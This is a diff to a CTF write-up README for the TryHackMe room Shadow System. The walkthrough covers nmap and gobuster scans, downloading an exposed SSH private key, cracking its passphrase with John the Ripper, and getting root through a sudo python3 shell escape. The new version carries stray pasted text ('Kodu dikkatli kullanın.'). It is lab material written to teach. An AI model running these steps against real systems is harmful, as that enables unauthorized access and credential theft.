@@ -4,102 +4,60 @@
 ![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy%20%2F%20Medium-2ea44f?style=for-the-badge)
 
-## Room Overview
 
-**Shadow System** is a Linux boot-to-root Capture The Flag (CTF) machine created for **TryHackMe**. The challenge walks players through service discovery, web directory enumeration, credential retrieval, SSH initial access as `tom`, and local privilege escalation to `root` via misconfigured `sudo` permissions.
+Shadow System — TryHackMe Official Write-Up
 
-* **Room Name:** Shadow System
-* **Author:** shadowxy
-* **Target OS:** Linux
-* **Key Concepts:** Network Enumeration, Web Discovery, SSH Access, Sudo Privilege Escalation
 
----
+Room Overview
 
-## 1. Reconnaissance
+Shadow System is an Easy-level Linux boot-to-root CTF machine by shadowxy focused on service discovery, web enumeration leading to an exposed SSH key, passphrase cracking, and a misconfigured sudo Python binary for root access.
 
-Begin by running an Nmap scan against the target IP address to enumerate open ports and running services:
+1. Reconnaissance
 
-```bash
+• Nmap Scan: Identify open services (22/tcp SSH and 80/tcp HTTP).bash
 nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
-```
+Kodu dikkatli kullanın.
 
-### Discovered Services
-| Port | State | Service | Description |
-| :--- | :--- | :--- | :--- |
-| `22/tcp` | Open | SSH | OpenSSH remote login service |
-| `80/tcp` | Open | HTTP | Apache2 web server |
+2. Web Enumeration
 
----
-
-## 2. Web Enumeration
-
-Inspect the web application hosted on port `80` and enumerate hidden directories or files using `gobuster`:
-
-```bash
+• Gobuster & Robots.txt: Scan port 80 and check robots.txt to discover the username tom and an exposed /.ssh/id_rsa file.bash
 gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
-```
+curl http://<TARGET_IP>/robots.txt
+wget http://<TARGET_IP>/.ssh/id_rsa
+Kodu dikkatli kullanın.
 
-Reviewing the discovered paths (such as `/shadow` and exposed files/backups) reveals credentials belonging to the user `tom`.
+3. Cracking SSH Key & Initial Access
 
----
-
-## 3. Initial Access
-
-Use the discovered credentials to establish an SSH session as `tom`:
-
-```bash
-ssh tom@<TARGET_IP>
-```
-
-### Retrieving the User Flag
-Once authenticated, inspect `tom`'s home directory and read `user.txt`:
-
-```bash
-ls -la ~
+• John the Ripper: Prepare the key permissions, extract the hash with ssh2john, and crack the passphrase using rockyou.txt.bash
+chmod 600 id_rsa
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Kodu dikkatli kullanın.
+• SSH Login & User Flag: Access the machine as tom and read user.txt.bash
+ssh -i id_rsa tom@<TARGET_IP>
 cat ~/user.txt
-```
+Kodu dikkatli kullanın.
 
-> **User Flag:** `THM{<user_flag_here>}`
+	• User Flag: THM{<PASTE_YOUR_REAL_USER_FLAG_HERE>}
 
----
+4. Privilege Escalation
 
-## 4. Privilege Escalation
-
-After gaining a foothold on the system, check what commands `tom` is allowed to execute with `sudo`:
-
-```bash
+• Sudo Rights: Check sudo -l to find that tom can run /usr/bin/python3 as root without a password.bash
 sudo -l
-```
-
-### Vulnerability Analysis
-The output shows that `tom` can run `python3` as `root` without providing a password (`NOPASSWD`):
-
-```text
-(ALL : ALL) NOPASSWD: /usr/bin/python3
-```
-
-### Exploiting Sudo Python3
-Using a standard GTFOBins payload, spawn an interactive `root` shell via Python's `os` module:
-
-```bash
+Kodu dikkatli kullanın.
+• GTFOBins Payload: Spawn a root shell via Python.bash
 sudo python3 -c 'import os; os.system("/bin/bash")'
-```
+Kodu dikkatli kullanın.
 
----
+5. Root Flag
 
-## 5. Root Flag
-
-Verify root privileges and read the final flag from `/root`:
-
-```bash
+• Root Access: Verify identity and read root.txt.bash
 id
 cat /root/root.txt
-```
+Kodu dikkatli kullanın.
 
-> **Root Flag:** `THM{<root_flag_here>}`
+	• Root Flag: THM{<PASTE_YOUR_REAL_ROOT_FLAG_HERE>}
 
----
+Conclusion
 
-## Conclusion
-
-**Shadow System** demonstrates how exposed web artifacts combined with overly permissive `sudo` rules can lead to full system compromise. Always restrict `NOPASSWD` privileges on binaries capable of spawning system shells.
+Securing web directories against exposed SSH keys and auditing NOPASSWD sudo configurations on interpreters like Python are essential to prevent complete system takeovers.
